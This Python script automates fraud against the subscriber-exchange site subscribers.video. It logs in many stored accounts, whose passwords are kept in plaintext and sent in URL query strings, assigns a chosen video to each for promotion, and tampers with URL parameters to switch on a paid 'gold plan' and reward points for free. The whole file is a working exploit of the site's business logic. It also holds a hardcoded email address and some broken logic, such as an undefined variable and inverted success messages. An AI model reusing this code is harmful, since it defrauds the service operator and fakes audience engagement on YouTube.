import requests
from requests.structures import CaseInsensitiveDict
import sqlite3

# global 
base = "https://www."
# host 
#host = "submenow.com"
host = "subscribers.video"

# make headers
def getHeaders(session):
    headers = CaseInsensitiveDict()
    headers["cookie"] = "JSESSIONID=" + session + ";"
    return headers

# login into the application
def login(host, username, password):
    tail = "/signinclick.html"
    data = "?email=" + username + "&idchannel=" + password + "&isSignIn=true&name="
    url = base + host + tail + data
    resp = requests.get(url)
    loggedIn = resp.text.split('ok":')[1].split(",")[0]
    if (loggedIn == "true"):
        print("[+] Logged In")
    else:
        print("[-] Login Failed")
    # return the JSESSIONID cookie
    return resp.headers["Set-Cookie"].split("JSESSIONID=")[1].split(";")[0]

# print number of subsribers to get per account
def subToGet():
    db = database()
    accounts = getAccounts(db)
    for account in accounts:
        session = login(host, account[1], account[2])
        url = "https://www." + host + "/account.html?sub=true"
        resp = requests.get(url, headers=getHeaders(session))
        subs = resp.text.split("id='will-get-subs'>")[2].split("</b>")[0].strip()
        print("You Will Get " + subs + " Subscribers For Account " + str(account[0]))
    closeDB(db)

# subscription shifter
def shifter(host, session, idVideo):
    idUser = getAccountId(host, session)
    tail = "/assignuservideo.html?idUser=" + idUser + "&idVideo=" + idVideo
    url = base + host + tail
    resp = requests.get(url, headers=getHeaders(session))
    split = resp.text.split('finished":')[1].split(",")[0]
    if (split == "true"):
        print("[+] Video Promotion Added")
    else:
        print("[-] Shift Failed")

# activate gold plan
def activatePlan(host, session):
    accountId = getAccountId(host, session)
    url = base + host + "/account.html?accountId=" + accountId + "&plan=4&day=3"
    resp = requests.get(url, headers=getHeaders(session))
    split = resp.text.split('finished":')[1].split(",")[0]
    if (split == "false"):
        print("[+] Plan Activation Failed")
    else:
        print("[-] Plan Activated")

# get account Id
def getAccountId(host, session):
    tail = "/account.html"
    url = base + host + tail
    resp = requests.get(url, headers=getHeaders(session))
    accountId = resp.text.split("ID:&nbsp;<b>")[1].split("</b>")[0].strip()
    return accountId

# create a sqlite database accounts.db if it doesn't exist
def database():
    conn = sqlite3.connect("accounts.db")
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
    conn.commit()
    # if created, print message and return connection
    print("[+] Starting Up")
    return conn

# get all videos from the database make a dictionary of id and videoId
def getVideoIds():
    # create connection to solutiontips database
    db = sqlite3.connect("SolutionTipsVideos.db")
    c = db.cursor()
    c.execute("SELECT * FROM Videos")
    videos = c.fetchall()
    videoIds = {}
    for video in videos:
        videoIds[video[0]] = video[1]
    db.close()
    return videoIds

# add account menu
def addAccountMenu(conn):
    num = 0
    while num != -9:
        username = "cartoon.in@gmail.com" #input("[+] Enter Username: ")
        password = input("[+] Enter Password: ")
        addAccount(conn, username, password)
        num = int(input("[+] Enter -9 to exit: "))

# close the database connection
def closeDB(conn):
    conn.close()
    print("[+] Shutting Down")

# add account to the database
def addAccount(conn, username, password):
    c = conn.cursor()
    c.execute("INSERT INTO accounts VALUES (NULL, ?, ?)", (username, password))
    conn.commit()
    print("[+] Account Saved")
    print("[+] Total Accounts Saved " + str(numAccounts(conn)))

# get all accounts from the database and print them
def getAccounts(conn):
    c = conn.cursor()
    c.execute("SELECT * FROM accounts")
    accounts = c.fetchall()
    return accounts

# delete account from database as per password
def deleteAccount(conn):
    password = input("[+] Enter Password: ")
    c = conn.cursor()
    c.execute("DELETE FROM accounts WHERE password = ?", (password,))
    conn.commit()
    print("[+] Account Deleted")

# number of accounts in the database
def numAccounts(conn):
    c = conn.cursor()
    c.execute("SELECT * FROM accounts")
    accounts = c.fetchall()
    return len(accounts)

# print all account
def printAccounts(conn):
    accounts = getAccounts(conn)
    for account in accounts:
        print(account[0], account[1], account[2])

# menu
def promote(conn, startFrom, endAt):
    # video id 
    videoId = input("[+] Enter Video Link: ").split("=")[1]
    # get user credentials from db
    accounts = getAccounts(conn)
    # counter
    i = 1
    # loop through accounts and login
    for account in accounts:
        if i > startFrom and i <= endAt: 
            print("Tempering Account " + str(account[0]))
            # login
            session = login(host, account[1], account[2])
            # subscription shifter
            shifter(host, session, videoId)
            # activate plan
            activatePlan(host, session)
        else:
            print("Skipping Account " + str(account[0]))
        
        # increment the counter
        i += 1
    
    # print status
    print("[+] Promotion For Video " + videoId + " Started")

# add reward points 
def addRewardPoints(host, seesion):
    accountId = getAccountId(host, seesion)
    url = base + host + "/account.html?accountId=" + accountId + "&plan=4&day=-100"
    resp = requests.get(url, headers=getHeaders(session))
    split = resp.text.split('finished":')[1].split(",")[0]
    if (split == "false"):
        print("[+] Can't Add Reward Points")
    else:
        print("[-] Reward Points Added")

# promote version 2
def promote2(conn):
    videoId = getVideoIds()
    accounts = getAccounts(conn)

    for account in accounts:
        session = login(host, account[1], account[2])
        shifter(host, session, videoId[account[0]])
        activatePlan(host, session)
        print("[+] Promoted " + videoId[account[0]] + " Using Account " + str(account[0]))
            

# menu
def main():
    # create database connection
    conn = database()
    # menu for adding accounts and promoting videos
    print("[+] 1. Add Account")
    print("[+] 2. Promote Video")
    print("[+] 3. Print Accounts")
    print("[+] 4. Delete Account")
    print("[+] 5. Get Subscribers To Get")
    print("[+] 6. Promote *")
    option = input("[+] Enter Option: ")
    if (option == "1"):
        addAccountMenu(conn)
    elif (option == "2"):
        startFrom = int(input("[+] Start: "))
        endAt = int(input("[+] End: "))
        promote(conn, startFrom, endAt)
    elif (option == "3"):
        printAccounts(conn)
    elif (option == "4"):
        deleteAccount(conn)
    elif (option == "5"):
        subToGet()
    elif (option == "6"):
        promote2(conn)
    else:
        print("[-] Invalid Option")
    # close database connection
    closeDB(conn)


# start point
main()

        
